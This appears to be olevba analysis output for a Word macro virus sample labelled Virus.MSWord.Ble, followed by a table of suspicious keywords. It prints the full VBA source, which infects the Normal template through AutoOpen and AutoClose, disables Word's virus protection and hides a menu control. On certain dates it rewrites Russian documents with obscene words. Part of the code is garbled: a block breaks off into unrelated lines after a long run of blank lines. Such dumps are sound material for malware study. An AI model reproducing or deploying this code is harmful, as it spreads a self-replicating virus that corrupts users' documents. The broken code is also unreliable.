olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ble-38d47adbd504a746cfcfa832023133ed2d2d8e96
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ble-38d47adbd504a746cfcfa832023133ed2d2d8e96 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MacroBle.bas 
in file: Virus.MSWord.Ble-38d47adbd504a746cfcfa832023133ed2d2d8e96 - OLE stream: 'Macros/VBA/MacroBle'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public myname$
Public Changed As Boolean
Public sz As Long
Public k As Long
Public NoSpecial As Boolean
Option Base 1
Dim ends$(2, 12)
Dim Moora1$(40)
Dim Moora2$(10)
Dim Bls$(3)



Sub AutoOpen()
Attribute AutoOpen.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.AutoOpen"
 On Error GoTo 1
 myname$ = "MacroBle"
 WordBasic.DisableAutoMacros 0
 
 If Not CheckNormal Then
  Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
  Set mytemp = NormalTemplate.OpenAsDocument
  mytemp.SaveAs (GetPath$ + "NORMAL1.DOT")
  mytemp.Close SaveChanges:=wdSaveChanges
End If
GoTo 2
1:
 'MsgBox "Fuck up !"
 Resume 2
2:
 RunOtherMacro MacN:="AutoOpen"
End Sub
Function CheckNormal()
 cn = False
 For Each x In NormalTemplate.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckNormal = cn
End Function
Sub RunOtherMacro(MacN As String)
 On Error GoTo Run_Error
 For Each Mac In ActiveDocument.VBProject.VBComponents
   If (Mac.Type = 1) And (Mac.Name <> "MacroBle") Then
    Application.Run "project." + Mac.Name + "." + MacN
Skip_Error:
   End If
  Next Mac
 GoTo End_Run
Run_Error:
 Resume Skip_Error
End_Run:

End Sub

Function CheckActive()
 cn = False
 For Each x In ActiveDocument.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckActive = cn
 End Function

Sub AutoClose()
Attribute AutoClose.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.AutoClose"
 On Error GoTo errorlevel2
 If Not CheckActive Then Application.OrganizerCopy Source:=GetPath$ + "NORMAL1.DOT", Destination:=ActiveDocument.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
 If MyDate Then Optimize
 GoTo end_f
errorlevel2:
 'MsgBox "More Errors !"
 Resume end_f
end_f:
 RunOtherMacro MacN:="AutoClose"
End Sub

Function GetPath$()
 s$ = NormalTemplate.FullName
 s$ = Mid$(s$, 1, Len(s$) - 10)
 GetPath$ = s$
End Function

Sub AutoExec()
Attribute AutoExec.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.AutoExec"
 Options.VirusProtection = False
 Set x = CommandBars("Tools").Controls(12)
 x.Visible = False
 x.Enabled = False
 ends$(1, 1) = "ûé"
 ends$(1, 2) = "îãî"
 ends$(1, 3) = "îìó"
 ends$(1, 4) = "ûì"
 ends$(1, 5) = "îì"
 ends$(1, 6) = "àÿ"
 ends$(1, 7) = "îé"
 ends$(1, 8) = "óþ"
 ends$(1, 9) = "ûå"
 ends$(1, 10) = "ûõ"
 ends$(1, 11) = "ûìè"
 ends$(1, 12) = "îå"
 ends$(2, 1) = "èé"
 ends$(2, 2) = "åãî"
 ends$(2, 3) = "åìó"
 ends$(2, 4) = "èì"
 ends$(2, 5) = "åì"
 ends$(2, 6) = "åé"
 ends$(2, 7) = "èå"
 ends$(2, 8) = "èõ"
 ends$(2, 9) = "èì"
 ends$(2, 10) = "èìè"
 ends$(2, 11) = "åå"
 ends$(2, 12) = "àÿ"
 
 Moora1$(1) = "õóåâ"
 Moora1$(2) = "åáàíóò"
 Moora1$(3) = "ãîíèì"
 Moora1$(4) = "äåáèëüí"
 Moora1$(5) = "ìóäà÷í"
 Moora1$(6) = "õðåíîâ"
 Moora1$(7) = "äóáîâ"
 Moora1$(8) = "ñîïëèâ"
 Moora1$(9) = "êîðÿâ"
 Moora1$(10) = "óáëþäî÷í"
 
 Moora1$(11) = "ïåäðèëüí"
 Moora1$(12) = "ãîâíÿí"
 Moora1$(13) = "êîçëèí"
 Moora1$(14) = "åáëèâ"
 Moora1$(15) = "åáàí"
 Moora1$(16) = "ïèçäàíóò"
 Moora1$(17) = "ïðèäóðîøí"
 Moora1$(18) = "øèçàíóò"
 Moora1$(19) = "ãíóñí"
 Moora1$(20) = "ñòðåìí"
 
 Moora1$(21) = "ãíóñàâ"
 Moora1$(22) = "òóïîðûë"
 Moora1$(23) = "êàíàëèçàöèîíí"
 Moora1$(24) = "âèçãëèâ"
 Moora1$(25) = "ñëåïîøàð"
 Moora1$(26) = "ïðûùàâ"
 Moora1$(27) = "ðâîòí"
 Moora1$(28) = "ñêëî÷í"
 Moora1$(29) = "óðîäëèâ"
 Moora1$(30) = "áîðîäàâî÷í"
 
 Moora1$(31) = "îáñòðóõàíí"
 Moora1$(32) = "íåíîðìàëüí"
 Moora1$(33) = "ïëþãàâ"
 Moora1$(34) = "êîñÿ÷í"
 Moora1$(35) = ""
 Moora1$(36) = ""
 Moora1$(37) = ""
 Moora1$(38) = ""
 Moora1$(39) = ""
 Moora1$(40) = ""

 Moora2$(1) = "ñâèíÿ÷"
 Moora2$(2) = "îõóåâø"
 Moora2$(3) = "âîíþ÷"
 Moora2$(4) = "îõóåâàþù"
 Moora2$(5) = ""
 Moora2$(6) = ""
 Moora2$(7) = ""
 Moora2$(8) = ""
 Moora2$(9) = ""
 Moora2$(10) = ""
 
 Bls$(1) = "áëÿ"
 Bls$(2) = "â íàòóðå"
 Bls$(3) = "òâîþ ìàòü"
 
End Sub

Sub Optimize()
Attribute Optimize.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute Optimize.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.MakeSoviet"
 AutoExec
 Randomize Timer
 f = System.LanguageDesignation
 If UCase$(Mid$(f, 1, 3)) = "ÐÓÑ" Then
  sz = ActiveDocument.Words.Count
  Changed = False
  Optima = 0
  If sz <= 500 Then
   For k = 1 To sz
    tss$ = ActiveDocument.Words.Item(k)
    Application.StatusBar = "Ïîäãîòîâêà ê ñîõðàíåíèþ: " + Str$(k \ 5) + "%"
    If Len(tss$) > 4 Then GoSub Do_Trunslate
   Next k
  Else
   li = 1
   While li < 100
    k = Int(sz * Rnd + 1)
    tss$ = ActiveDocument.Words.Item(k)
    If Len(tss$) > 4 Then
     GoSub Do_Trunslate
     li = li + 1
     Application.StatusBar = "Ïîäãîòîâêà ê ñîõðàíåíèþ: " + Str$(li) + "%"
    End If
   Wend
  End If
  Application.StatusBar = "Ïîäãîòîâêà çàâåðøåíà. Îïòèìèçàöèÿ: " + Str$(Optima) + "%"
 End If
  GoTo end_proc
  
Do_Trunslate:
   tss$ = TrunslateWord(tss$)
   If Changed Then
    ActiveDocument.Words(k) = tss$
    Changed = False
    Optima = Optima + 1
   End If
  Return
end_proc:
End Sub

Function TrunslateWord$(ts As String)
 tw$ = ts
 spaces = CheckSpace(ts)
 If spaces <> 0 Then ts = Mid$(ts, 1, Len(ts) - spaces)
 Lts = Len(ts)
 If Lts > 4 Then
  If CheckAdjective(ts) Then
   c = 1
   While c <= 2
    i = 1
    While i <= 12
     CEnd$ = ends$(c, i)
     MyEnd$ = Mid$(ts, Lts - Len(CEnd$) + 1, Len(CEnd$))
     If MyEnd$ = CEnd$ Then
      Changed = True
      Select Case c
       Case 1
        tw$ = Moora1$(Int(34 * Rnd + 1)) + CEnd$
       Case 2
        tw$ = Moora2$(Int(3 * Rnd + 1)) + CEnd$
      End Select
      If spaces <> 0 Then tw$ = tw$ + Space(spaces)
      FLett = Mid$(ts, 1, 1)
      If UCase$(FLett) = FLett Then tw$ = UCase$(Mid$(tw$, 1, 1)) + Mid$(tw$, 2, Len(tw$) - 1)
      i = 12
      c = 2
     End If
     i = i + 1
    Wend
    c = c + 1
   Wend
  End If
 End If
 TrunslateWord$ = tw$
End Function

Function CheckSpace(csp As String) As Integer
 spp = 0
 n = Len(csp)
 If n > 3 Then
  While (Mid$(csp, n, 1) = " ") And (n > 3)
   n = n - 1
   spp = spp + 1
  Wend
 End If
 CheckSpace = spp
End Function


Function MyDate() As Boolean
 dt$ = Date$
 If InStr(1, dt$, "15") <> 0 Then MyDate = True Else MyDate = False
End Function


Function CheckAdjective(adj As String) As Boolean
 cadj = False
 NoSpecial = True
 atj$ = LCase$(Mid$(adj, 1, 5))
 Select Case atj$
  Case "åæåäí"
   NoSpecial = False
  Case "àäàïò"
   NoSpecial = False
  Case "óðîâí"
   NoSpecial = False
  Case "íàñèë"
   NoSpecial = False
 End Select
 If NoFuckenError(atj$) Then
  Set mySynInfo = SynonymInfo(adj)
  myPos = mySynInfo.PartOfSpeechList
  i = UBound(myPos)
  If i >= 1 Then If myPos(1) = wdAdjective Then cadj = True
 End If
 CheckAdjective = cadj
End Function

Function NoFuckenError(wrd As String) As Boolean
 atj = Mid$(wrd, 1, 1)
 Select Case atj
  Case "î"
   NoSpecial = False
  Case "ï"
   NoSpecial = False
  Case "ð"
   NoSpecial = False
  Case "ñ"
   NoSpecial = False
  Case "ò"
   NoSpecial = False
  Case "â"
   NoSpecial = False
  Case "ë"
   NoSpecial = False
  Case "ì"
   NoSpecial = False
  Case "ç"
   NoSpecial = False
  Case "÷"
   NoSpecial = False











































  sz = ActiveDocument.Words.Count
  If sz > 500 Then
   For i = 1 To 50
    Application.StatusBar = "Ïîäãîòîâêà: " + Str$(i * 2)
    k = Int((sz - 1) * Rnd + 1)
    tss$ = RTrim(ActiveDocument.Words(k))
    If Len(tss$) > 4 Then
     tss1$ = RTrim(ActiveDocument.Words(k + 1))
     If Len(tss1$) > 4 Then
     If Int(3 * Rnd + 1) = 1 Then
      blya$ = ", " + Bls$(Int(3 * Rnd + 1)) + ", "
      ActiveDocument.Words(k).InsertAfter (blya$)
     End If
     End If
    End If
   Next i
   Application.StatusBar = "Ãîòîâî."
  End If
 End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

